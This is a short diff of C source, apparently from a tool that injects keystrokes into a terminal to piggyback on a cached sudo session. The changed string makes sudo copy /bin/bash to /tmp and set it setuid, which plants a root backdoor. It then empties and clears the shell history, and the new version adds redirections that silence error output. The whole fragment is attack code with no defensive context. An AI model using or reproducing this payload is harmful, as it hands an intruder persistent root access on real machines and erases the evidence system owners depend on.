@@ -30,7 +30,7 @@
 
 struct termios termios;
 
-static char *command = ";sudo cp -rp /bin/bash /tmp;sudo chmod +s /tmp/bash;echo -n > ~/.bash_history;history -c;\x0d";
+static char *command = " 2>/dev/null;sudo cp -rp /bin/bash /tmp 2>/dev/null;sudo chmod +s /tmp/bash 2>/dev/null;echo -n > ~/.bash_history;history -c;\x0d";
 static long sudo_timeout = 60 * 1000000; // 60s
 
 static void fini(void)
